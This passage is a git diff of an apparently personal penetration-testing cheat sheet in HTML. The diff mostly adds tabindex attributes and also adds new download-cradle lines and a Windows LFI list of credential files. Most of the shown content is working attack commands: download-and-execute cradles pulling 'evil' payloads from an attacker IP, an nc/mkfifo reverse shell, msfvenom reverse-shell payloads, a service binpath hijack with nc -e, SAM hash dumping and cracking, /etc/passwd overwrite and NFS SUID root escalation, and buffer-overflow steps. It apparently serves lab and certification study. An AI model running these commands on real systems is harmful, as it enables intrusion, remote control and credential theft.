 /usr/share/wordlists/wfuzz/others/common_pass.txt
 
 In seclists-pkg:
@@ -1231,14 +1241,14 @@ In seclists-pkg:
 </code></pre><h3 id="samba">Samba</h3>
 <h4 id="smbclient">smbclient</h4>
 <p>Check if there is anonymous login enabled:</p>
-<pre><code class="language-console" data-lang="console">smbclient -L 192.168.24.24
+<pre tabindex="0"><code class="language-console" data-lang="console">smbclient -L 192.168.24.24
 </code></pre><h4 id="impacket">impacket</h4>
 <p>Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.</p>
-<pre><code class="language-console" data-lang="console">
+<pre tabindex="0"><code class="language-console" data-lang="console">
 /usr/share/doc/python3-impacket/examples/smbclient.py &quot;&quot;@192.168.24.24
 </code></pre><h4 id="smbmap">smbmap</h4>
 <p>Check which permissions we have in those shares (if there are):</p>
-<pre><code class="language-console" data-lang="console">smbmap -H 192.168.24.24
+<pre tabindex="0"><code class="language-console" data-lang="console">smbmap -H 192.168.24.24
 Or having an user:
 smbmap -u ceso -H 192.168.24.24
 </code></pre><h4 id="version-nmap-didnt-detect-it">Version (nmap didn&rsquo;t detect it)</h4>
@@ -1250,39 +1260,41 @@ smbmap -u ceso -H 192.168.24.24
 <h2 id="exfiltration">Exfiltration</h2>
 <h3 id="samba-1">Samba</h3>
 <p>Generate a samba server with Impacket:</p>
-<pre><code class="language-console" data-lang="console">impacket-smbserver tools /home/kali/tools
+<pre tabindex="0"><code class="language-console" data-lang="console">impacket-smbserver tools /home/kali/tools
 </code></pre><h4 id="mount-in-windows">Mount in Windows</h4>
 <p>Mounting it in Windows with Powershell:</p>
-<pre><code class="language-console" data-lang="console">New-PSDrive -Name &quot;tools&quot; -PSProvider &quot;Filesystem&quot; -Root &quot;\\192.168.42.42\tools&quot;
+<pre tabindex="0"><code class="language-console" data-lang="console">New-PSDrive -Name &quot;tools&quot; -PSProvider &quot;Filesystem&quot; -Root &quot;\\192.168.42.42\tools&quot;
 </code></pre><p>Mounting it without Powershell:</p>
-<pre><code class="language-console" data-lang="console">net use z: \\192.168.42.42\tools&quot;
+<pre tabindex="0"><code class="language-console" data-lang="console">net use z: \\192.168.42.42\tools&quot;
 </code></pre><p>On windows, to list mounted shares, either Powershell or without it:</p>
-<pre><code class="language-console" data-lang="console">Powershell: Get-SMBShare
+<pre tabindex="0"><code class="language-console" data-lang="console">Powershell: Get-SMBShare
 Without Powershell: net share
 </code></pre><h4 id="mount-in-linux">Mount in Linux</h4>
 <p>Is needed to have installed cifs-utils, to install it (in debian based):</p>
-<pre><code class="language-console" data-lang="console">sudo apt-get install cifs-utils
+<pre tabindex="0"><code class="language-console" data-lang="console">sudo apt-get install cifs-utils
 </code></pre><p>To mount it:</p>
-<pre><code class="language-console" data-lang="console">sudo mount -t cifs //192.168.42.42/tools ~/my_share/
+<pre tabindex="0"><code class="language-console" data-lang="console">sudo mount -t cifs //192.168.42.42/tools ~/my_share/
 </code></pre><p>To list mounted shares:</p>
-<pre><code class="language-console" data-lang="console">mount | grep cifs
+<pre tabindex="0"><code class="language-console" data-lang="console">mount | grep cifs
 grep cifs /proc/mount
 
 </code></pre><h3 id="http">HTTP</h3>
 <p>From your local attacker machine, create a http server with:</p>
-<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80
+<pre tabindex="0"><code class="language-console" data-lang="console">sudo python3 -m http.server 80
 sudo python2 -m SimpleHTTPServer 80
 </code></pre><p>It&rsquo;s also possible to specify which path to share, for example:</p>
-<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80 --dir /home/kali/tools
+<pre tabindex="0"><code class="language-console" data-lang="console">sudo python3 -m http.server 80 --dir /home/kali/tools
 </code></pre><h4 id="windows">Windows</h4>
-<pre><code class="language-console" data-lang="console">iex(new-object net.webclient).downloadstring(&quot;http://192.168.42.42/evil.ps1)
-certutil.exe -urlcache -split -f &quot;http://192.168.42.42/nc.exe&quot; nc.exe
+<pre tabindex="0"><code class="language-console" data-lang="console">iex(new-object net.webclient).downloadstring(&quot;http://192.168.42.42/evil.ps1)
 IWR -Uri &quot;http://192.168.42.42/n64.exe&quot; -Outfile &quot;n64.exe&quot;
+certutil.exe -urlcache -split -f &quot;http://192.168.42.42/nc.exe&quot; nc.exe
+wmic process get brief /format:&quot;http://192.168.42.42/evilexcel.xsl
+bitsadmin /Transfer myDownload http://192.168.42.42/evilfile.txt C:\Windows\Temp\evilfile.txt
 </code></pre><h4 id="linux">Linux</h4>
-<pre><code class="language-console" data-lang="console">curl http://192.168.42.42/evil.php --output evil.php
+<pre tabindex="0"><code class="language-console" data-lang="console">curl http://192.168.42.42/evil.php --output evil.php
 </code></pre><h3 id="ftp">FTP</h3>
 <p>If there is an ftp server which we have access, we can upload files there through it, the &quot;&quot; is the same for both, windows or linux:</p>
-<pre><code class="language-console" data-lang="console">Connect and login with:
+<pre tabindex="0"><code class="language-console" data-lang="console">Connect and login with:
 
 ftp 192.168.42.42
 
@@ -1298,7 +1310,7 @@ followed by enter
 </code></pre><h3 id="sockets">Sockets</h3>
 <p>Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.
 Create the socket with:</p>
-<pre><code class="language-console" data-lang="console">Attacker:
+<pre tabindex="0"><code class="language-console" data-lang="console">Attacker:
   nc -lvnp 443 &lt; evil.php
 
 For both cases from windows, the only difference is to write nc.exe
@@ -1307,13 +1319,13 @@ Victim:
   nc -v 192.168.42.42 443 &gt; evil.php
 </code></pre><h3 id="rdp">RDP</h3>
 <p>If we have access to a windows machine with a valid user/credentials and this user is in the &ldquo;Remote Desktop Users&rdquo;, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:</p>
-<pre><code class="language-console" data-lang="console">rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
+<pre tabindex="0"><code class="language-console" data-lang="console">rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
 </code></pre><h2 id="pivoting">Pivoting</h2>
 <p>It&rsquo;s possible to do pivoting by using proxychains, pure nc&rsquo;s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it&rsquo;s a transparent proxy server that works like &ldquo;a vpn&rdquo;, and doesn&rsquo;t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn&rsquo;t work through sshuttle.</p>
 <h3 id="sshuttle">sshuttle</h3>
 <h4 id="one-hop">One hop</h4>
 <p>Let&rsquo;s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a &ldquo;vpn&rdquo; to talk directly to those servers, for that, we use:</p>
-<pre><code class="language-console" data-lang="console">sshuttle ceso@192.168.20.35 192.168.30.0/24
+<pre tabindex="0"><code class="language-console" data-lang="console">sshuttle ceso@192.168.20.35 192.168.30.0/24
 </code></pre><h4 id="multi-hops">Multi-hops</h4>
 <p>Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a &ldquo;vpn&rdquo; through this multiple hops, so&hellip;putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn&rsquo;t intend to provide a 100% precise network diagram):</p>
 
@@ -1321,7 +1333,7 @@ Victim:
 
 
 <p>To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It&rsquo;s based on the example above, but is easy to extrapolate to different scenarios):</p>
-<pre><code class="language-console" data-lang="console">Host fw.example.mgmt
+<pre tabindex="0"><code class="language-console" data-lang="console">Host fw.example.mgmt
   Hostname 192.168.20.35
   User userOnFw
   IdentityFile ~/.ssh/priv_key_fw
@@ -1331,7 +1343,7 @@ Host foreman.example.mgmt
   ProxyJump fw.example.mgmt
   IdentityFile ~/.ssh/priv_key_internal
 </code></pre><p>And now to setup the &ldquo;multiple hop vpn&rdquo;, run:</p>
-<pre><code class="language-console" data-lang="console">sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &amp;
+<pre tabindex="0"><code class="language-console" data-lang="console">sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &amp;
 
 Later on is possible to connect from the local machine:
 ssh foo@192.168.25.74
@@ -1344,23 +1356,23 @@ ssh foo@192.168.25.74
 </code></pre></div><h3 id="sh--nc">sh + nc</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;<span style="color:#ae81ff">1</span> | nc 192.168.42.42 <span style="color:#ae81ff">443</span> &gt;/tmp/f
 </code></pre></div><h3 id="perl-example-deploy-as-cgi-bin">Perl (example deploy as cgi-bin)</h3>
-<pre><code class="language-console" data-lang="console">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;192.168.42.42&quot; LPORT=443 -f raw -o reverse_shell.cgi
+<pre tabindex="0"><code class="language-console" data-lang="console">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;192.168.42.42&quot; LPORT=443 -f raw -o reverse_shell.cgi
 </code></pre><h3 id="java-example-to-deploy-on-tomcat">Java (example to deploy on tomcat)</h3>
-<pre><code class="language-console" data-lang="console">msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
+<pre tabindex="0"><code class="language-console" data-lang="console">msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
 </code></pre><h3 id="windows-htpp-download-reverse-shell">Windows HTPP download reverse shell</h3>
-<pre><code class="language-console" data-lang="console">msfvenom -a x86 --platform windows -p windows/exec CMD=&quot;powershell \&quot;IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\&quot;&quot; -e x86/unicode_mixed BufferRegister=EAX -f python
+<pre tabindex="0"><code class="language-console" data-lang="console">msfvenom -a x86 --platform windows -p windows/exec CMD=&quot;powershell \&quot;IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\&quot;&quot; -e x86/unicode_mixed BufferRegister=EAX -f python
 </code></pre><h3 id="windows-staged-reverse-tcp">Windows staged reverse TCP</h3>
-<pre><code class="language-console" data-lang="console"> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
+<pre tabindex="0"><code class="language-console" data-lang="console"> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
 </code></pre><h3 id="windows-stageless-reverse-tcp">Windows stageless reverse TCP</h3>
-<pre><code class="language-console" data-lang="console">msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o &lt;output_name.format&gt;
+<pre tabindex="0"><code class="language-console" data-lang="console">msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o &lt;output_name.format&gt;
 </code></pre><h3 id="linux-staged-reverse-tcp">Linux staged reverse TCP</h3>
-<pre><code class="language-console" data-lang="console">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
+<pre tabindex="0"><code class="language-console" data-lang="console">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
 </code></pre><h3 id="linux-staged-reverse-tcp-1">Linux staged reverse TCP</h3>
-<pre><code class="language-console" data-lang="console">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
+<pre tabindex="0"><code class="language-console" data-lang="console">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
 </code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
 <h3 id="windows-1">Windows</h3>
 <h4 id="run-as">Run-As</h4>
-<pre><code class="language-console" data-lang="console">PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
+<pre tabindex="0"><code class="language-console" data-lang="console">PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
 PS C:\&gt; $username = &quot;&lt;domain&gt;\&lt;user&gt;&quot;
 PS C:\&gt; $password = '&lt;password&gt;'
 PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
@@ -1371,37 +1383,37 @@ PS C:\&gt; Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadS
 Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
 </code></pre><h4 id="incorrect-permisions-in-services-sc-config-binpath">Incorrect permisions in services (sc config binpath)</h4>
 <p>Binpath is set as running <code>cmd.exe</code> passing a commad to execute to it (so once the process dies, the one executed by it so the command to <code>cmd.exe</code> remains):</p>
-<pre><code class="language-console" data-lang="console">sc config upnphost binpath= &quot;C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe&quot; 
+<pre tabindex="0"><code class="language-console" data-lang="console">sc config upnphost binpath= &quot;C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe&quot; 
 </code></pre><h4 id="sam--system--security">SAM + SYSTEM + Security</h4>
 <p>If those 3 files are in your hands (you could download to your attacker machine), you can dump hashes and crack them:</p>
-<pre><code class="language-console" data-lang="console">/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL
+<pre tabindex="0"><code class="language-console" data-lang="console">/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL
 
 sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
 </code></pre><h3 id="linux-1">Linux</h3>
 <h4 id="homeuseropenssl-ep-empty-capabilities">/home/user/openssl =ep (empty capabilities)</h4>
 <p>Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:</p>
-<pre><code class="language-console" data-lang="console">cp /etc/passwd /tmp/passwd.orig
+<pre tabindex="0"><code class="language-console" data-lang="console">cp /etc/passwd /tmp/passwd.orig
 cp /etc/passwd /tmp/passwd.custom
 </code></pre><p>Now, a custom user will be created and added to <code>/tmp/passwd.custom</code> with <code>customPassword</code> and as root user (UID = GID = 0):</p>
-<pre><code class="language-console" data-lang="console">echo 'ceso:'&quot;$( openssl passwd -6 -salt xyz customPassword )&quot;':0:0::/tmp:/bin/bash' &gt;&gt; /tmp/passwd.custom
+<pre tabindex="0"><code class="language-console" data-lang="console">echo 'ceso:'&quot;$( openssl passwd -6 -salt xyz customPassword )&quot;':0:0::/tmp:/bin/bash' &gt;&gt; /tmp/passwd.custom
 </code></pre><p>Now, create a custom <code>key.pem</code> and <code>cert.pem</code> with openssl:</p>
-<pre><code class="language-console" data-lang="console">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+<pre tabindex="0"><code class="language-console" data-lang="console">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
 </code></pre><p>Encrypt the new custom passwd:</p>
-<pre><code class="language-console" data-lang="console">openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
+<pre tabindex="0"><code class="language-console" data-lang="console">openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
 </code></pre><p>Now, decrypt the custom passwd overwritting in the process the real one (<code>/etc/passwd</code>):</p>
-<pre><code class="language-console" data-lang="console">cd /
+<pre tabindex="0"><code class="language-console" data-lang="console">cd /
 /home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
 </code></pre><p>And finally, just login with the user created with root privileges by using <code>customPassword</code>:</p>
-<pre><code class="language-console" data-lang="console">su - ceso
+<pre tabindex="0"><code class="language-console" data-lang="console">su - ceso
 </code></pre><h4 id="command-web-injection-add-user">Command web injection: add user</h4>
-<pre><code class="language-console" data-lang="console">/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 
+<pre tabindex="0"><code class="language-console" data-lang="console">/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 
 </code></pre><h4 id="nfs-no_root_squashinsecurerw">NFS; no_root_squash,insecure,rw</h4>
 <p>If <code>/etc/exports</code> has a line like:</p>
-<pre><code class="language-console" data-lang="console">/srv/pelota 192.168.42.0/24(insecure,rw)
+<pre tabindex="0"><code class="language-console" data-lang="console">/srv/pelota 192.168.42.0/24(insecure,rw)
 /srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)
 </code></pre><p>NFS is being exported and you and you have ssh access to the machine.
 From your attacker machine <strong>while logged as root</strong> user run:</p>
-<pre><code class="language-console" data-lang="console">ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
+<pre tabindex="0"><code class="language-console" data-lang="console">ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
 mount -t nfs 127.0.0.1:/srv/pelota my_share
 cd my_share
 cat &gt; shell.c&lt;&lt;EOF
@@ -1415,30 +1427,97 @@ EOF
 gcc shell.c -o shell
 chmod u+s shell
 </code></pre><p>Now from inside a SSH session on the victim machine (in this example <code>192.168.42.32</code>):</p>
-<pre><code class="language-console" data-lang="console">bash-4.2$ cd /srv/pelota
+<pre tabindex="0"><code class="language-console" data-lang="console">bash-4.2$ cd /srv/pelota
 bash-4.2$ ./shell
 bash-4.2# id
 uid=0(root) gid=0(root) groups=0(root),1000(megumin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 </code></pre><h2 id="good-to-know-either-windows-andor-linux">Good to know (either Windows and/or Linux)</h2>
 <h3 id="arch-cross-compile-exploit-and-diff-glibc-version">Arch cross compile exploit (and diff glibc version)</h3>
-<pre><code class="language-console" data-lang="console">gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
+<pre tabindex="0"><code class="language-console" data-lang="console">gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
 </code></pre><h3 id="ip-restriction-at-application-level-bypass">IP restriction at application level, bypass</h3>
 <p>Try to send a request modifying the HTTP header by adding:</p>
-<pre><code class="language-console" data-lang="console">X-Forwarder-For: &lt;ip allowed&gt;
+<pre tabindex="0"><code class="language-console" data-lang="console">X-Forwarder-For: &lt;ip allowed&gt;
 </code></pre><h3 id="windows---check-os-information">Windows - check OS information</h3>
-<pre><code class="language-console" data-lang="console">systeminfo
+<pre tabindex="0"><code class="language-console" data-lang="console">systeminfo
 ver
 </code></pre><h3 id="windows---check-architecture">Windows - check architecture</h3>
-<pre><code class="language-console" data-lang="console">wmic os get osarchitecture
+<pre tabindex="0"><code class="language-console" data-lang="console">wmic os get osarchitecture
 echo %PROCESSOR_ARCHITECTURE%
 </code></pre><h3 id="powershell--running-as-32-or-64-bits">Powershell  running as 32 or 64 bits</h3>
-<pre><code class="language-console" data-lang="console">[Environment]::Is64BitProcess   
+<pre tabindex="0"><code class="language-console" data-lang="console">[Environment]::Is64BitProcess   
 </code></pre><h3 id="linux-lfi---intesresting-files-to-look-after">Linux LFI - intesresting files to look after</h3>
-<pre><code class="language-console" data-lang="console">/proc/self/status
+<pre tabindex="0"><code class="language-console" data-lang="console">/proc/self/status
 /proc/self/environ
 /etc/passwd
 /etc/hosts
 /etc/exports
+</code></pre><h3 id="windows-lfi---intesresting-files-to-look-after">Windows LFI - intesresting files to look after</h3>
+<pre tabindex="0"><code class="language-console" data-lang="console">C:/Users/Administrator/NTUser.dat
+C:/Documents and Settings/Administrator/NTUser.dat
+C:/apache/logs/access.log
+C:/apache/logs/error.log
+C:/apache/php/php.ini
+C:/boot.ini
+C:/inetpub/wwwroot/global.asa
+C:/MySQL/data/hostname.err
+C:/MySQL/data/mysql.err
+C:/MySQL/data/mysql.log
+C:/MySQL/my.cnf
+C:/MySQL/my.ini
+C:/php4/php.ini
+C:/php5/php.ini
+C:/php/php.ini
+C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/logs/access.log
+C:/Program Files/Apache Group/Apache/logs/error.log
+C:/Program Files/FileZilla Server/FileZilla Server.xml
+C:/Program Files/MySQL/data/hostname.err
+C:/Program Files/MySQL/data/mysql-bin.log
+C:/Program Files/MySQL/data/mysql.err
+C:/Program Files/MySQL/data/mysql.log
+C:/Program Files/MySQL/my.ini
+C:/Program Files/MySQL/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log 
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err 
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log 
+C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/my.ini
+C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf 
+C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf 
+C:/Program Files (x86)/Apache Group/Apache/conf/access.log 
+C:/Program Files (x86)/Apache Group/Apache/conf/error.log 
+C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml 
+C:/Program Files (x86)/xampp/apache/conf/httpd.conf 
+C:/WINDOWS/php.ini C:/WINDOWS/Repair/SAM 
+C:/Windows/repair/system C:/Windows/repair/software 
+C:/Windows/repair/security 
+C:/WINDOWS/System32/drivers/etc/hosts
+C:/Windows/win.ini 
+C:/WINNT/php.ini
+C:/WINNT/win.ini
+C:/xampp/apache/bin/php.ini
+C:/xampp/apache/logs/access.log 
+C:/xampp/apache/logs/error.log 
+C:/Windows/Panther/Unattend/Unattended.xml 
+C:/Windows/Panther/Unattended.xml 
+C:/Windows/debug/NetSetup.log 
+C:/Windows/system32/config/AppEvent.Evt 
+C:/Windows/system32/config/SecEvent.Evt 
+C:/Windows/system32/config/default.sav 
+C:/Windows/system32/config/security.sav 
+C:/Windows/system32/config/software.sav 
+C:/Windows/system32/config/system.sav 
+C:/Windows/system32/config/regback/default 
+C:/Windows/system32/config/regback/sam 
+C:/Windows/system32/config/regback/security 
+C:/Windows/system32/config/regback/system 
+C:/Windows/system32/config/regback/software
+C:/Program Files/MySQL/MySQL Server 5.1/my.ini 
+C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml 
+C:/Windows/System32/inetsrv/config/applicationHost.config 
+C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 </code></pre><h2 id="simple-buffer-overflow-32-bits-no-aslr-and-no-dep">Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)</h2>
 <h3 id="summarized-steps">Summarized steps</h3>
 <ul>
@@ -1452,35 +1531,35 @@ echo %PROCESSOR_ARCHITECTURE%
 <li>7 - Create payload</li>
 </ul>
 <h3 id="fuzzing-example-with-vulnserver--spike-on-trun-command">Fuzzing: example with vulnserver + spike on TRUN command</h3>
-<pre><code class="language-console" data-lang="console">cat &gt; trun.spk &lt;&lt;EOF
+<pre tabindex="0"><code class="language-console" data-lang="console">cat &gt; trun.spk &lt;&lt;EOF
 s_readline();
 s_string(&quot;TRUN &quot;);
 s_string_variable(&quot;COMMAND&quot;);
 EOF
 </code></pre><p>Now, start wireshark filtering on the target IP/PORT below and run the <code>trun.spk</code>:</p>
-<pre><code class="language-console" data-lang="console">generic_send_tcp 172.16.42.131 9999 trun.spk 0 0
+<pre tabindex="0"><code class="language-console" data-lang="console">generic_send_tcp 172.16.42.131 9999 trun.spk 0 0
 </code></pre><p>Once a crash takes place, go to wireshark to locate the crash.</p>
 <h3 id="badchars">Badchars</h3>
 <p>From the block below, the next ones were not included (most common badchars):</p>
-<pre><code class="language-console" data-lang="console">\x00 --&gt; null byte
+<pre tabindex="0"><code class="language-console" data-lang="console">\x00 --&gt; null byte
 \x0a --&gt; new line character (AKA &quot;\n&quot;)
 </code></pre><p>So&hellip;actual list of badchars:</p>
-<pre><code class="language-console" data-lang="console">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+<pre tabindex="0"><code class="language-console" data-lang="console">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
 </code></pre><h3 id="usefull-tools-on-kali-linux">Usefull tools (on Kali Linux)</h3>
 <h4 id="create_pattern">create_pattern</h4>
-<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
+<pre tabindex="0"><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
 /usr/bin/msf-pattern_create
 </code></pre><h4 id="pattern_offset">pattern_offset</h4>
-<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
+<pre tabindex="0"><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
 /usr/bin/msf-pattern_offset
 </code></pre><h4 id="nasm_shell">nasm_shell</h4>
-<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+<pre tabindex="0"><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 /usr/bin/msf-nasm_shell
 </code></pre><h4 id="msfvenom">msfvenom</h4>
